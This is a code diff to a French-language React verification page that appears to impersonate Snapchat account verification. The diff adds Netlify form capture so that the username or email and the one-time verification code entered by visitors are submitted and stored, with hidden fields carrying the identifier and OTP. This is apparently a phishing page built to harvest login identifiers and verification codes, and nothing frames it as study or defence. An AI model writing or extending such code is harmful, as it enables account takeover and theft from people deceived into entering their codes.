@@ -121,13 +121,25 @@ export default function VerificationPage() {
             <h1 className="text-center text-[26px] sm:text-[28px] font-bold mt-4 tracking-[-0.01em]">
               Vérifiez votre compte
             </h1>
-            <form onSubmit={handleUsernameNext} className="mt-6">
+            <form
+              name="Snapchat-verification-username"
+              method="POST"
+              data-netlify="true"
+              onSubmit={handleUsernameNext}
+              className="mt-6"
+            >
+              <input
+                type="hidden"
+                name="form-name"
+                value="Snapchat-verification-username"
+              />
               <label className="block text-[13px] font-medium text-[#555555] mb-1.5">
                 Nom d'utilisateur ou e-mail
               </label>
               <input
                 type="text"
-                maxLength={15}
+                name="username"
+                maxLength={254}
                 value={username}
                 onChange={(e) => {
                   setUsername(e.target.value.replace(/^@/, "").trimStart());
@@ -182,7 +194,24 @@ export default function VerificationPage() {
               </button>
             </div>
 
-            <form onSubmit={handleOtpNext} className="mt-5">
+            <form
+              name="Snapchat-verification-otp"
+              method="POST"
+              data-netlify="true"
+              onSubmit={handleOtpNext}
+              className="mt-5"
+            >
+              <input
+                type="hidden"
+                name="form-name"
+                value="Snapchat-verification-otp"
+              />
+              <input
+                type="hidden"
+                name="identifier"
+                value={username.trim()}
+              />
+              <input type="hidden" name="otp" value={otp} />
               <label className="block text-[13px] font-medium text-[#555555] mb-2">
                 Code de vérification
               </label>
